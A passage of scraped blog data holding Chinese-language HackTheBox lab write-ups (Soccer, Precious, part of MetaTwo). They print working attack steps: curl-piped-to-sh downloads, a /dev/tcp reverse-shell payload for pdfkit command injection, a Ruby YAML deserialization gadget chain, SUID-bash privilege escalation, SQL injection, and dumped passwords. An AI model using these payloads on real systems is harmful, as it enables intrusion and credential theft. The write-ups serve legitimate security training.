from (UNKNOWN) [10.10.11.194] 37056 bash: cannot set terminal process group (1039): Inappropriate ioctl for device bash: no job control in this shell www-data@soccer:~/html/tiny/uploads$ whoami&amp;&amp;id whoami&amp;&amp;id www-data uid=33(www-data) gid=33(www-data) groups=33(www-data) 成功得到一个 shell 权限提升User首先去跑一个 linpea curl -L http://10.10.14.11/linpeas.sh|sh ══════════════════════════════╣ Network Information ╠══════════════════════════════ ╚═════════════════════╝ ╔══════════╣ Hostname, hosts and DNS soccer 127.0.0.1 localhost soccer soccer.htb soc-player.soccer.htb 127.0.1.1 ubuntu-focal ubuntu-focal 看到还有一个子域名，我们也去加入 hosts 解析 echo 10.10.11.194 soc-player.soccer.htb &gt;&gt; /etc/hosts 这次就要多一些功能了 先去随便注册一个账号吧 登入后台后貌似是一个验票的功能 var ws = new WebSocket(&quot;ws://soc-player.soccer.htb:9091&quot;); window.onload = function () { 在源代码中发现了这个，这里应该是需要利用 ws 了 https://rayhan0x01.github.io/ctf/2021/04/02/blind-sqli-over-websocket-automation.html 找到了一篇参考文章 使用里面那个脚本，然后把第六行刚改为“ws:&#x2F;&#x2F;soc-player.soccer.htb:9091” 第十五行的内容改为“data &#x3D; ‘{“id”:”%s”}’ % message” 然后运行 ┌──(root㉿kali)-[~/Desktop] └─# python3 sql.py [+] Starting MiddleWare Server [+] Send payloads in http://localhost:8081/?id=* 然后使用 sqlmap 跑就行了 ┌──(root㉿kali)-[~/Desktop] └─# sqlmap -u &quot;http://localhost:8081/?id=1&quot; --batch -D soccer_db -T accounts -C username,password --dump Database: soccer_db Table: accounts [2 entries] +----------+----------------------+ | username | password | +----------+----------------------+ | player | PlayerOftheMatch2022 | +----------+----------------------+ 然后使用 ssh 进行登陆 ┌──(root㉿kali)-[~/Desktop] └─# ssh player@10.10.11.194 player@10.10.11.194&#39;s password: Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.4.0-135-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage System information as of Wed Dec 21 09:22:10 UTC 2022 System load: 0.01 Processes: 229 Usage of /: 70.0% of 3.84GB Users logged in: 0 Memory usage: 25% IPv4 address for eth0: 10.10.11.194 Swap usage: 0% 0 updates can be applied immediately. The list of available updates is more than a week old. To check for new updates run: sudo apt update Last login: Tue Dec 13 07:29:10 2022 from 10.10.14.19 player@soccer:~$ whoami&amp;&amp;id player uid=1001(player) gid=1001(player) groups=1001(player) 成功拿到 user 权限 player@soccer:~$ cat user.txt d7452b954047ec61d79b73ddbaeb6302 成功拿到 user 权限的 flag 文件 Rootplayer@soccer:~$ find / -perm -4000 2&gt;/dev/null /usr/local/bin/doas /usr/lib/snapd/snap-confine /usr/lib/dbus-1.0/dbus-daemon-launch-helper /usr/lib/openssh/ssh-keysign /usr/lib/policykit-1/polkit-agent-helper-1 /usr/lib/eject/dmcrypt-get-device /usr/bin/umount /usr/bin/fusermount /usr/bin/mount /usr/bin/su /usr/bin/newgrp /usr/bin/chfn /usr/bin/sudo /usr/bin/passwd /usr/bin/gpasswd /usr/bin/chsh /usr/bin/at /snap/snapd/17883/usr/lib/snapd/snap-confine /snap/core20/1695/usr/bin/chfn /snap/core20/1695/usr/bin/chsh /snap/core20/1695/usr/bin/gpasswd /snap/core20/1695/usr/bin/mount /snap/core20/1695/usr/bin/newgrp /snap/core20/1695/usr/bin/passwd /snap/core20/1695/usr/bin/su /snap/core20/1695/usr/bin/sudo /snap/core20/1695/usr/bin/umount /snap/core20/1695/usr/lib/dbus-1.0/dbus-daemon-launch-helper /snap/core20/1695/usr/lib/openssh/ssh-keysign 寻找 SUID 二进制文件，找到了一个 &#x2F;usr&#x2F;local&#x2F;bin&#x2F;doas，我们进入路径 &#x2F;usr&#x2F;local&#x2F; 在路径 &#x2F;usr&#x2F;local&#x2F; 中，除了 &#x2F;bin&#x2F;doas 我们还能看到 &#x2F;etc&#x2F;doas.conf player@soccer:/usr/local/etc$ cat doas.conf permit nopass player as root cmd /usr/bin/dstat 它告诉我们，允许我们以 root 权限运行 &#x2F;usr&#x2F;bin&#x2F;dstat 文件 player@soccer:/usr/local/share$ ls -la total 24 drwxr-xr-x 6 root root 4096 Nov 17 09:16 . drwxr-xr-x 10 root root 4096 Nov 15 21:38 .. drwxr-xr-x 2 root root 4096 Nov 15 21:39 ca-certificates drwxrwx--- 2 root player 4096 Dec 12 14:53 dstat drwxrwsr-x 2 root staff 4096 Nov 17 08:06 fonts drwxr-xr-x 5 root root 4096 Nov 17 09:09 man 我们在存储插件的 share&#x2F;dstat&#x2F; 目录中有写入权限 那么我们只需要创建一个返回 bash suid 的 python 文件并将其作为插件运行 cd /usr/local/share/dstat echo &#39;import os;os.system(&quot;chmod u+s /bin/bash&quot;)&#39; &gt; dstat_privesc.py doas -u root /usr/bin/dstat --privesc &amp;&gt;/dev/null 然后查看 &#x2F;bin&#x2F;bash 文件的权限即可看到已经成功利用上了 ls -l /bin/bash 然后使用 &#x2F;bin&#x2F;bash -p 进行提权 player@soccer:/usr/local/share/dstat$ /bin/bash -p bash-5.0# whoami&amp;&amp;id root uid=1001(player) gid=1001(player) euid=0(root) groups=1001(player) 成功拿到 root 账户权限 bash-5.0# cat /root/root.txt 1bb7d214069e85a0b01582a7399b7a0b 成功拿到 root 权限的 flag 文件","categories":[],"tags":[{"name":"Hackthebox","slug":"Hackthebox","permalink":"http://www.lucifiel.com/tags/Hackthebox/"}]},{"title":"Precious - Hackthebox","slug":"Hackthebox/Easy/Hackthebox-Precious","date":"2022-11-26T11:38:36.000Z","updated":"2023-06-17T02:23:59.000Z","comments":true,"path":"2022/11/26/Hackthebox/Easy/Hackthebox-Precious/","link":"","permalink":"http://www.lucifiel.com/2022/11/26/Hackthebox/Easy/Hackthebox-Precious/","excerpt":"","text":"Hackthebox - Precious靶场信息 靶场类型 信息收集Nmap┌──(root㉿kali)-[~/Desktop] └─# nmap -sS -sV -A -sC -p- --min-rate 5000 10.10.11.189 Starting Nmap 7.93 ( https://nmap.org ) at 2022-12-31 20:35 EST Nmap scan report for 10.10.11.189 Host is up (0.26s latency). Not shown: 65533 closed tcp ports (reset) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0) | ssh-hostkey: | 3072 845e13a8e31e20661d235550f63047d2 (RSA) | 256 a2ef7b9665ce4161c467ee4e96c7c892 (ECDSA) |_ 256 33053dcd7ab798458239e7ae3c91a658 (ED25519) 80/tcp open http nginx 1.18.0 |_http-title: Did not follow redirect to http://precious.htb/ |_http-server-header: nginx/1.18.0 No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ). TCP/IP fingerprint: OS:SCAN(V=7.93%E=4%D=12/31%OT=22%CT=1%CU=35049%PV=Y%DS=2%DC=T%G=Y%TM=63B0E3 OS:93%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=105%TI=Z%CI=Z%II=I%TS=A)OP OS:S(O1=M539ST11NW7%O2=M539ST11NW7%O3=M539NNT11NW7%O4=M539ST11NW7%O5=M539ST OS:11NW7%O6=M539ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)EC OS:N(R=Y%DF=Y%T=40%W=FAF0%O=M539NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F= OS:AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5( OS:R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z% OS:F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N OS:%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%C OS:D=S) Network Distance: 2 hops Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel TRACEROUTE (using port 21/tcp) HOP RTT ADDRESS 1 264.06 ms 10.10.14.1 2 264.51 ms 10.10.11.189 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 46.32 seconds 增加一个 hosts 解析 echo 10.10.11.189 precious.htb &gt;&gt; /etc/hosts Http 首页就一个功能，将网页转换为 PDF 提示无法加载远程 URL，尝试一下本地 这里使用 127.0.0.1 和 localhost 都不行，我们本地开一个 http 服务看看是否有请求 ┌──(root㉿kali)-[~/Desktop] └─# python3 -m http.server 80 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ... ┌──(root㉿kali)-[~/Desktop] └─# python3 -m http.server 80 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ... 10.10.11.189 - - [31/Dec/2022 20:41:39] &quot;GET / HTTP/1.1&quot; 200 - 确实是有请求，并且成功转换为 pdf文件 ┌──(root㉿kali)-[~/Downloads] └─# exiftool ylm4oxm111sk45cwb57jmfctpy0epjfq.pdf ExifTool Version Number : 12.49 File Name : ylm4oxm111sk45cwb57jmfctpy0epjfq.pdf Directory : . File Size : 19 kB File Modification Date/Time : 2022:12:31 20:41:41-05:00 File Access Date/Time : 2022:12:31 20:42:00-05:00 File Inode Change Date/Time : 2022:12:31 20:41:42-05:00 File Permissions : -rw-r--r-- File Type : PDF File Type Extension : pdf MIME Type : application/pdf PDF Version : 1.4 Linearized : No Page Count : 1 Creator : Generated by pdfkit v0.8.6 这里可以看到生成的工具是 pdfkit 0.8.6 漏洞利用 https://security.snyk.io/vuln/SNYK-RUBY-PDFKIT-2869795 https://www.ctfiot.com/84447.html 找到了两份参考文档 首先创建一个 payload http://example.com/?name=%20`bash -c &#39;exec bash -i &amp;&gt;/dev/tcp/10.10.14.84/4444 &lt;&amp;1&#39;` 然后使用 nc 监听一个端口 nc -nvlp 4444 然后去请求我们的 payload ┌──(root㉿kali)-[~/Desktop] └─# nc -nvlp 4444 listening on [any] 4444 ... connect to [10.10.14.84] from (UNKNOWN) [10.10.11.189] 40412 bash: cannot set terminal process group (678): Inappropriate ioctl for device bash: no job control in this shell ruby@precious:/var/www/pdfapp$ whoami&amp;&amp;id whoami&amp;&amp;id ruby uid=1001(ruby) gid=1001(ruby) groups=1001(ruby) 成功反弹回 shell 权限提升Userruby@precious:~/.bundle$ pwd pwd /home/ruby/.bundle ruby@precious:~/.bundle$ cat config cat config --- BUNDLE_HTTPS://RUBYGEMS__ORG/: &quot;henry:Q3c1AqGHtoI0aXAYFH&quot; 在 &#x2F;home&#x2F;ruby&#x2F;.bundle 中有一个 config 文件，里面似乎是 henry 用户的密码 ┌──(root㉿kali)-[~/Desktop] └─# ssh henry@10.10.11.189 The authenticity of host &#39;10.10.11.189 (10.10.11.189)&#39; can&#39;t be established. ED25519 key fingerprint is SHA256:1WpIxI8qwKmYSRdGtCjweUByFzcn0MSpKgv+AwWRLkU. This key is not known by any other names Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Warning: Permanently added &#39;10.10.11.189&#39; (ED25519) to the list of known hosts. henry@10.10.11.189&#39;s password: Linux precious 5.10.0-19-amd64 #1 SMP Debian 5.10.149-2 (2022-10-21) x86_64 The programs included with the Debian GNU/Linux system are free software; the exact distribution terms for each program are described in the individual files in /usr/share/doc/*/copyright. Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent permitted by applicable law. Last login: Sat Dec 31 18:20:32 2022 from 10.10.14.78 henry@precious:~$ whoami&amp;&amp;id henry uid=1000(henry) gid=1000(henry) groups=1000(henry) 成功拿到 user 权限 henry@precious:~$ cat user.txt 415eb4be868d88438bda7f02ce8528f1 成功拿到 user 权限的 flag 文件 Roothenry@precious:~$ sudo -l Matching Defaults entries for henry on precious: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin User henry may run the following commands on precious: (root) NOPASSWD: /usr/bin/ruby /opt/update_dependencies.rb 我们可以使用 root 权限利用 ruby 执行 &#x2F;opt&#x2F;update_dependencies.rb henry@precious:~$ cat /opt/update_dependencies.rb # Compare installed dependencies with those specified in &quot;dependencies.yml&quot; require &quot;yaml&quot; require &#39;rubygems&#39; # TODO: update versions automatically def update_gems() end def list_from_file YAML.load(File.read(&quot;dependencies.yml&quot;)) end def list_local_gems Gem::Specification.sort_by{ |g| [g.name.downcase, g.version] }.map{|g| [g.name, g.version.to_s]} end gems_file = list_from_file gems_local = list_local_gems gems_file.each do |file_name, file_version| gems_local.each do |local_name, local_version| if(file_name == local_name) if(file_version != local_version) puts &quot;Installed version differs from the one specified in file: &quot; + local_name else puts &quot;Installed version is equals to the one specified in file: &quot; + local_name end end end end 这里看到，这里使用了容易受到反序列化攻击的 YAML https://staaldraad.github.io/post/2021-01-09-universal-rce-ruby-yaml-load-updated/ 这里找到了一份参考文档 --- - !ruby/object:Gem::Installer i: x - !ruby/object:Gem::SpecFetcher i: y - !ruby/object:Gem::Requirement requirements: !ruby/object:Gem::Package::TarReader io: &amp;1 !ruby/object:Net::BufferedIO io: &amp;1 !ruby/object:Gem::Package::TarReader::Entry read: 0 header: &quot;abc&quot; debug_output: &amp;1 !ruby/object:Net::WriteAdapter socket: &amp;1 !ruby/object:Gem::RequestSet sets: !ruby/object:Net::WriteAdapter socket: !ruby/module &#39;Kernel&#39; method_id: :system git_set: id method_id: :resolve 将上面的内容保存为 dependencies.yml 然后去运行 henry@precious:~$ sudo /usr/bin/ruby /opt/update_dependencies.rb sh: 1: reading: not found uid=0(root) gid=0(root) groups=0(root) Traceback (most recent call last): 33: from /opt/update_dependencies.rb:17:in `&lt;main&gt;&#39; 32: from /opt/update_dependencies.rb:10:in `list_from_file&#39; 31: from /usr/lib/ruby/2.7.0/psych.rb:279:in `load&#39; 30: from /usr/lib/ruby/2.7.0/psych/nodes/node.rb:50:in `to_ruby&#39; 29: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:32:in `accept&#39; 28: from /usr/lib/ruby/2.7.0/psych/visitors/visitor.rb:6:in `accept&#39; 27: from /usr/lib/ruby/2.7.0/psych/visitors/visitor.rb:16:in `visit&#39; 26: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:313:in `visit_Psych_Nodes_Document&#39; 25: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:32:in `accept&#39; 24: from /usr/lib/ruby/2.7.0/psych/visitors/visitor.rb:6:in `accept&#39; 23: from /usr/lib/ruby/2.7.0/psych/visitors/visitor.rb:16:in `visit&#39; 22: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:141:in `visit_Psych_Nodes_Sequence&#39; 21: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:332:in `register_empty&#39; 20: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:332:in `each&#39; 19: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:332:in `block in register_empty&#39; 18: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:32:in `accept&#39; 17: from /usr/lib/ruby/2.7.0/psych/visitors/visitor.rb:6:in `accept&#39; 16: from /usr/lib/ruby/2.7.0/psych/visitors/visitor.rb:16:in `visit&#39; 15: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:208:in `visit_Psych_Nodes_Mapping&#39; 14: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:394:in `revive&#39; 13: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:402:in `init_with&#39; 12: from /usr/lib/ruby/vendor_ruby/rubygems/requirement.rb:218:in `init_with&#39; 11: from /usr/lib/ruby/vendor_ruby/rubygems/requirement.rb:214:in `yaml_initialize&#39; 10: from /usr/lib/ruby/vendor_ruby/rubygems/requirement.rb:299:in `fix_syck_default_key_in_requirements&#39; 9: from /usr/lib/ruby/vendor_ruby/rubygems/package/tar_reader.rb:59:in `each&#39; 8: from /usr/lib/ruby/vendor_ruby/rubygems/package/tar_header.rb:101:in `from&#39; 7: from /usr/lib/ruby/2.7.0/net/protocol.rb:152:in `read&#39; 6: from /usr/lib/ruby/2.7.0/net/protocol.rb:319:in `LOG&#39; 5: from /usr/lib/ruby/2.7.0/net/protocol.rb:464:in `&lt;&lt;&#39; 4: from /usr/lib/ruby/2.7.0/net/protocol.rb:458:in `write&#39; 3: from /usr/lib/ruby/vendor_ruby/rubygems/request_set.rb:388:in `resolve&#39; 2: from /usr/lib/ruby/2.7.0/net/protocol.rb:464:in `&lt;&lt;&#39; 1: from /usr/lib/ruby/2.7.0/net/protocol.rb:458:in `write&#39; /usr/lib/ruby/2.7.0/net/protocol.rb:458:in `system&#39;: no implicit conversion of nil into String (TypeError) 执行成功了，然后我们修改一下代码 --- - !ruby/object:Gem::Installer i: x - !ruby/object:Gem::SpecFetcher i: y - !ruby/object:Gem::Requirement requirements: !ruby/object:Gem::Package::TarReader io: &amp;1 !ruby/object:Net::BufferedIO io: &amp;1 !ruby/object:Gem::Package::TarReader::Entry read: 0 header: &quot;abc&quot; debug_output: &amp;1 !ruby/object:Net::WriteAdapter socket: &amp;1 !ruby/object:Gem::RequestSet sets: !ruby/object:Net::WriteAdapter socket: !ruby/module &#39;Kernel&#39; method_id: :system git_set: chmod +s /bin/bash method_id: :resolve henry@precious:~$ sudo /usr/bin/ruby /opt/update_dependencies.rb sh: 1: reading: not found Traceback (most recent call last): 33: from /opt/update_dependencies.rb:17:in `&lt;main&gt;&#39; 32: from /opt/update_dependencies.rb:10:in `list_from_file&#39; 31: from /usr/lib/ruby/2.7.0/psych.rb:279:in `load&#39; 30: from /usr/lib/ruby/2.7.0/psych/nodes/node.rb:50:in `to_ruby&#39; 29: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:32:in `accept&#39; 28: from /usr/lib/ruby/2.7.0/psych/visitors/visitor.rb:6:in `accept&#39; 27: from /usr/lib/ruby/2.7.0/psych/visitors/visitor.rb:16:in `visit&#39; 26: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:313:in `visit_Psych_Nodes_Document&#39; 25: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:32:in `accept&#39; 24: from /usr/lib/ruby/2.7.0/psych/visitors/visitor.rb:6:in `accept&#39; 23: from /usr/lib/ruby/2.7.0/psych/visitors/visitor.rb:16:in `visit&#39; 22: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:141:in `visit_Psych_Nodes_Sequence&#39; 21: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:332:in `register_empty&#39; 20: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:332:in `each&#39; 19: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:332:in `block in register_empty&#39; 18: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:32:in `accept&#39; 17: from /usr/lib/ruby/2.7.0/psych/visitors/visitor.rb:6:in `accept&#39; 16: from /usr/lib/ruby/2.7.0/psych/visitors/visitor.rb:16:in `visit&#39; 15: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:208:in `visit_Psych_Nodes_Mapping&#39; 14: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:394:in `revive&#39; 13: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:402:in `init_with&#39; 12: from /usr/lib/ruby/vendor_ruby/rubygems/requirement.rb:218:in `init_with&#39; 11: from /usr/lib/ruby/vendor_ruby/rubygems/requirement.rb:214:in `yaml_initialize&#39; 10: from /usr/lib/ruby/vendor_ruby/rubygems/requirement.rb:299:in `fix_syck_default_key_in_requirements&#39; 9: from /usr/lib/ruby/vendor_ruby/rubygems/package/tar_reader.rb:59:in `each&#39; 8: from /usr/lib/ruby/vendor_ruby/rubygems/package/tar_header.rb:101:in `from&#39; 7: from /usr/lib/ruby/2.7.0/net/protocol.rb:152:in `read&#39; 6: from /usr/lib/ruby/2.7.0/net/protocol.rb:319:in `LOG&#39; 5: from /usr/lib/ruby/2.7.0/net/protocol.rb:464:in `&lt;&lt;&#39; 4: from /usr/lib/ruby/2.7.0/net/protocol.rb:458:in `write&#39; 3: from /usr/lib/ruby/vendor_ruby/rubygems/request_set.rb:388:in `resolve&#39; 2: from /usr/lib/ruby/2.7.0/net/protocol.rb:464:in `&lt;&lt;&#39; 1: from /usr/lib/ruby/2.7.0/net/protocol.rb:458:in `write&#39; /usr/lib/ruby/2.7.0/net/protocol.rb:458:in `system&#39;: no implicit conversion of nil into String (TypeError) henry@precious:~$ ls -la /bin/bash -rwsr-sr-x 1 root root 1234376 Mar 27 2022 /bin/bash ok，执行成功，现在去完成提权吧 henry@precious:~$ /bin/bash -p bash-5.1# whoami&amp;&amp;id root uid=1000(henry) gid=1000(henry) euid=0(root) egid=0(root) groups=0(root),1000(henry) 成功提权到 root 用户 bash-5.1# cat /root/root.txt a8ac857576f35e2c14a259a4e77bfe55 成功拿到 root 权限的 flag 文件","categories":[],"tags":[{"name":"Hackthebox","slug":"Hackthebox","permalink":"http://www.lucifiel.com/tags/Hackthebox/"}]},{"title":"MetaTwo - Hackthebox","slug":"Hackthebox/Easy/Hackthebox-MetaTwo","date":"2022-10-29T11:38:36.000Z","updated":"2023-06-17T02:19:32.000Z","comments":true,"path":"2022/10/29/Hackthebox/Easy/Hackthebox-MetaTwo/","link":"","permalink":"http://www.lucifiel.com/2022/10/29/Hackthebox/Easy/Hackthebox-MetaTwo/","excerpt":"","text":"Hackthebox - MetaTwo靶场信息 靶场类型 信息收集Nmap┌──(root㉿kali)-[~/Desktop] └─# nmap -sS -sV -A -sC -p- --min-rate 5000 10.10.11.186 Starting Nmap 7.93 ( https://nmap.org ) at 2022-12-23 01:52 EST Warning: 10.10.11.186 giving up on port because retransmission cap hit (10). Nmap scan report for 10.10.11.186 Host is up (0.44s latency). Not shown: 65532 closed tcp ports (reset) PORT STATE SERVICE VERSION 21/tcp open ftp | fingerprint-strings: | GenericLines: | 220 ProFTPD Server (Debian) [::ffff:10.10.11.186] | Invalid command: try being more creative |_ Invalid command: try being more creative 22/tcp open ssh OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0) | ssh-hostkey: | 3072 c4b44617d2102d8fec1dc927fecd79ee (RSA) | 256 2aea2fcb23e8c529409cab866dcd4411 (ECDSA) |_ 256 fd78c0b0e22016fa050debd83f12a4ab (ED25519) 80/tcp open http nginx 1.18.0 |_http-title: Did not follow redirect to http://metapress.htb/ |_http-server-header: nginx/1.18.0 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port21-TCP:V=7.93%I=7%D=12/23%Time=63A55072%P=x86_64-pc-linux-gnu%r(Gen SF:ericLines,8F,&quot;220\\x20ProFTPD\\x20Server\\x20\\(Debian\\)\\x20\\[::ffff:10\\.10 SF:\\.11\\.186\\]\\r\\n500\\x20Invalid\\x20command:\\x20try\\x20being\\x20more\\x20cr SF:eative\\r\\n500\\x20Invalid\\x20command:\\x20try\\x20being\\x20more\\x20creativ SF:e\\r\\n&quot;); Aggressive OS guesses: Linux 5.0 - 5.3 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), Linux 4.15 - 5.6 (94%), Linux 5.3 - 5.4 (94%), Linux 2.6.32 (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 2.6.32 - 3.10 (92%) No exact OS matches for host (test conditions non-ideal). Network Distance: 2 hops Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel TRACEROUTE (using port 8080/tcp) HOP RTT ADDRESS 1 408.01 ms 10.10.16.1 2 648.09 ms 10.10.11.186 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 148.71 seconds 首先加入一个 hosts 解析 echo 10.10.11.186 metapress.htb &gt;&gt; /etc/hosts Http 是我翻译器不对吗，这里首页翻译出来意思是欢迎登记？我不是很明白是什么意思，这里给出了两个信息，有一个 &#x2F;events&#x2F; 目录，以及该页面是用 wordpress 搭建的。我们到处做一下信息收集 Wpscan┌──(root㉿kali)-[~/Desktop] └─# wpscan --url &quot;http://metapress.htb/&quot; --enumerate vt vp _______________________________________________________________ __ _______ _____ \\ \\ / / __ \\ / ____| \\ \\ /\\ / /| |__) | (___ ___ __ _ _ __ ® \\ \\/ \\/ / | ___/ \\___ \\ / __|/ _` | &#39;_ \\ \\ /\\ / | | ____) | (__| (_| | | | | \\/ \\/ |_| |_____/ \\___|\\__,_|_| |_| WordPress Security Scanner by the WPScan Team Version 3.8.22 Sponsored by Automattic - https://automattic.com/ @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart _______________________________________________________________ [+] URL: http://metapress.htb/ [10.10.11.186] [+] Started: Fri Dec 23 02:23:08 2022 Interesting Finding(s): [+] Headers | Interesting Entries: | - Server: nginx/1.18.0 | - X-Powered-By: PHP/8.0.24 | Found By: Headers (Passive Detection) | Confidence: 100% [+] robots.txt found: http://metapress.htb/robots.txt | Interesting Entries: | - /wp-admin/ | - /wp-admin/admin-ajax.php | Found By: Robots Txt (Aggressive Detection) | Confidence: 100% [+] XML-RPC seems to be enabled: http://metapress.htb/xmlrpc.php | Found By: Direct Access (Aggressive Detection) | Confidence: 100% | References: | - http://codex.wordpress.org/XML-RPC_Pingback_API | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/ | - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/ | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/ | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/ [+] WordPress readme found: http://metapress.htb/readme.html | Found By: Direct Access (Aggressive Detection) | Confidence: 100% [+] The external WP-Cron seems to be enabled: http://metapress.htb/wp-cron.php | Found By: Direct Access (Aggressive Detection) | Confidence: 60% | References: | - https://www.iplocation.net/defend-wordpress-from-ddos | - https://github.com/wpscanteam/wpscan/issues/1299 [+] WordPress version 5.6.2 identified (Insecure, released on 2021-02-22). | Found By: Rss Generator (Passive Detection) | - http://metapress.htb/feed/, &lt;generator&gt;https://wordpress.org/?v=5.6.2&lt;/generator&gt; | - http://metapress.htb/comments/feed/, &lt;generator&gt;https://wordpress.org/?v=5.6.2&lt;/generator&gt; [+] WordPress theme in use: twentytwentyone | Location: http://metapress.htb/wp-content/themes/twentytwentyone/ | Last Updated: 2022-11-02T00:00:00.000Z | Readme: http://metapress.htb/wp-content/themes/twentytwentyone/readme.txt | [!] The version is out of date, the latest version is 1.7 | Style URL: http://metapress.htb/wp-content/themes/twentytwentyone/style.css?ver=1.1 | Style Name: Twenty Twenty-One | Style URI: https://wordpress.org/themes/twentytwentyone/ | Description: Twenty Twenty-One is a blank canvas for your ideas and it makes the block editor your best brush. Wi... | Author: the WordPress team | Author URI: https://wordpress.org/ | | Found By: Css Style In Homepage (Passive Detection) | Confirmed By: Css Style In 404 Page (Passive Detection) | | Version: 1.1 (80% confidence) | Found By: Style (Passive Detection) | - http://metapress.htb/wp-content/themes/twentytwentyone/style.css?ver=1.1, Match: &#39;Version: 1.1&#39; [+] Enumerating Vulnerable Themes (via Passive and Aggressive Methods) Checking Known Locations - Time: 00:00:31 &lt;===================================================================================================================================&gt; (482 / 482) 100.00% Time: 00:00:31 [+] Checking Theme Versions (via Passive and Aggressive Methods) [i] No themes Found. [!] No WPScan API Token given, as a result vulnerability data has not been output. [!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register [+] Finished: Fri Dec 23 02:23:51 2022 [+] Requests Done: 509 [+] Cached Requests: 14 [+] Data Sent: 154.463 KB [+] Data Received: 518.845 KB [+] Memory used: 186.137 MB [+] Elapsed time: 00:00:43 这里确定了 wordpress 的版本为 5.6.2，然后发现了两个页面 /wp-admin/ /wp-admin/admin-ajax.php 漏洞利用我们在第二个页面中发现了一个插件 bookingpress 1.0.10 https://wpscan.com/vulnerability/388cd42d-b61a-42a4-8604-99b812db2357 发现了一个漏洞，似乎是允许我们进行注入的漏洞漏洞 对于这项漏洞的利用，我们需要一些信息，我们可以在 &#x2F;wp-admin&#x2F;admin-ajax.php 中找到 _wpnonce = b0a6dfdddb 然后我们就可以构造 poc 了 curl -i &#39;http://metapress.htb/wp-admin/admin-ajax.php&#39; --data &#39;action=bookingpress_front_get_category_services&amp;_wpnonce=b0a6dfdddb&amp;category_id=33&amp;total_service=-7502) UNION ALL SELECT @@version,@@version_comment,@@version_compile_os,1,2,3,4,5,6-- -&#39; -x http://127.0.0.1:8080 然后使用 curl 的 -x 参数将包发送到 burp 中 然后使用 copytofile 将其保存为 admin.req POST /wp-admin/admin-ajax.php HTTP/1.1 Host: metapress.htb User-Agent: curl/7.85.0 Accept: */* Content-Length: 185 Content-Type: application/x-www-form-urlencoded Connection: close action=bookingpress_front_get_category_services&amp;_wpnonce=b0a6dfdddb&amp;category_id=33&amp;total_service=-7502) UNION ALL SELECT @@version,@@version_comment,@@version_compile_os,1,2,3,4,5,6-- - 这是我们保存下来的文件，我们需要稍微修改一下，将 total_service 后面的参数改为 1 POST /wp-admin/admin-ajax.php HTTP/1.1 Host: metapress.htb User-Agent: curl/7.85.0 Accept: */* Content-Length: 185 Content-Type: application/x-www-form-urlencoded Connection: close action=bookingpress_front_get_category_services&amp;_wpnonce=b0a6dfdddb&amp;category_id=33&amp;total_service=1 这是我们修改好的文件，然后丢进 sqlmap 跑就行了 